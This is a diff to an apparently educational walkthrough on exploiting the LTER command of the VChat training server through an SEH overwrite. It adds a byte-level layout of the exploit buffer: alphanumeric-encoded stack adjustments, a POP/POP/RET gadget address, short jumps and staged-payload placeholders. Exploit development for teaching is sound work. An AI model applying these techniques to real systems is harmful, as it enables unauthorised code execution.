@@ -235,9 +235,9 @@ python boofuzz-vchat-LTER.py
 
 	<img src="Images/I12.png" width=600>
 
-    * We can see that the the `ESP` register (Containing the stack pointer) holds the address of `00EDEDC8`, however our buffer starts at `00EDEDD0`, which means we need to traverse 8 bytes before we reach a segment of the stack we control.
+    * We can see that the the `ESP` register (Containing the stack pointer) holds the address of `00EDEDC8`. An address pointing to our buffer is stored at `00EDEDD0`. We need to traverse 8 bytes before we reach a segment of the stack we control.
 
-6. We can use the fact that our extra data is on the stack and `pop` the extra data off into some register. The exact register does not really matter, as we simply want to remove it from the stack. We can use `mona.py` to find a SEH gadget that pops two elements off the stack (8-bytes as we are running a 32-bit program!), which places the stack pointer `ESP` in the correct position for us to start executing code we inject into our buffer; Use the command `!mona seh -cp nonull -cm safeseh=off -o` in Immunity Debugger as shown below.
+6. We can use the fact that our extra data is on the stack and `pop` the extra data off into some register. The exact register does not really matter, as we simply want to remove it from the stack. We can use `mona.py` to find a gadget that pops two elements off the stack (8-bytes as we are running a 32-bit program!), which places the stack pointer `ESP` in the correct position for us to start executing code we inject into our buffer. Use the command `!mona seh -cp nonull -cm safeseh=off -o` in Immunity Debugger as shown below.
 
 	<img src="Images/I13.png" width=600>
 
@@ -451,6 +451,58 @@ As introduced at the start of this walkthrough, some programs disallow or modify
 	2. Now we can check if this exploit works and preserves the SEH chain. We do this by once again setting a breakpoint and running the [exploit6.py](./SourceCode/exploit6.py) program as we did for [exploit5.py](./SourceCode/exploit5.py) in the second step of the [SEH Handler](#seh-handler) section. This is done so we can verify that the conditional jump is working correctly.
 
 	https://github.com/DaintyJet/VChat_LTER/assets/60448620/6a5b6fa3-0a6a-4a59-9b39-e860f33072dc
+
+
+
+```
+|------------------------------------------------------------|
+|    b'\x50'                                                 | # PUSH EAX
+|    b'\x05\x76\x40\x48\x48'                                 | # ADD EAX,48484076
+|    b'\x05\x75\x40\x48\x48'                                 | # ADD EAX,48484075 
+|    b'\x25\x35\x32\x31\x2a'                                 | # AND EAX,0x2A313235
+|    b'\x25\x4a\x4d\x4e\x55'                                 | # AND EAX,0x554E4D4A
+|    b'\x5c'                                                 | # POP ESP
+|    b'\x50'                                                 | # PUSH EAX
+|    b'\x66\x05\x1f\x12'                                     | # ADD AX,0x097F
+|    b'\x58'                                                 | # POP EAX
+|    b'\x54'                                                 | # PUSH ESP
+|------------------------------------------------------------|
+|    b'C' * 2                                                |
+|------------------------------------------------------------|
+|    struct.pack('<L', 0x6250103B)                           | # POP EDI # POP EBP # RETN
+|------------------------------------------------------------|
+|    b'\x74\x06'                                             | # JZ SHORT +0x8
+|    b'\x75\x08'                                             | # JNZ SHORT +0x10
+|------------------------------------------------------------|
+|    b'A' * (79 - (6 + len(JUMP_ENCODE)))                    |
+|------------------------------------------------------------|
+|    JUMP_ENCODE                                             |
+|------------------------------------------------------------|
+|    b'\x5c'                                                 | # POP ESP
+|    b'\x50'                                                 | # PUSH EAX
+|    b'\x2c\x30'                                             | # SUB AL,30
+|    b'\x58'                                                 | # POP EAX
+|    b'\x54'                                                 | # PUSH ESP
+|    b'A' * (3574 - (16 + 20 + 79 + 4 + len(FIRST_STAGE)))   | 
+|------------------------------------------------------------|
+|    FIRST_STAGE                                             |
+|------------------------------------------------------------|
+|    b'\x5c'                                                 | POP ESP
+|    b'\x50'                                                 | # PUSH EAX
+|    b'\x66\x2d\x69\x02'                                     | # SUB AX,0x0269
+|    b'\x66\x2d\x69\x02'                                     | # SUB AX,0x0269
+|    b'\x66\x2d\x69\x02'                                     | # SUB AX,0x0269
+|    b'\x66\x2d\x69\x02'                                     | # SUB AX,0x0269
+|    b'\x58'                                                 | # POP EAX
+|    b'\x54'                                                 | # PUSH ESP
+|------------------------------------------------------------|
+|    b'A' * 16                                               |
+|------------------------------------------------------------|
+|    b'LTER .'                                               |
+|------------------------------------------------------------|
+```
+
+
 
 #### Long Jump and Encoding
 1. Now, we have jumped onto the part of the buffer that contains our `C`s, and this region only has 41 bytes of space available, as this is not much space we will perform a *Long Jump* in order to leverage the larger region of space located earlier in the buffer. In the [GMON_SEH](https://github.com/DaintyJet/VChat_GMON_SEH) exploit, we performed a long jump as shown below:
